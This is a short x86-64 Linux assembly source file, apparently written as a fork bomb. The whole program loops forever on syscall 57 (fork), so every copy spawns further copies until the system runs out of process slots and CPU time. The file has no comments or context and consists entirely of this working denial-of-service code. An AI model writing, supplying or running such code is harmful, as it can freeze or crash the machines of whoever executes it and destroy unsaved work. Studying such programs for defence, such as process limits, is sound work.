.global _start

_start:
    movq $0x39, %rax
    syscall
    jmp _start
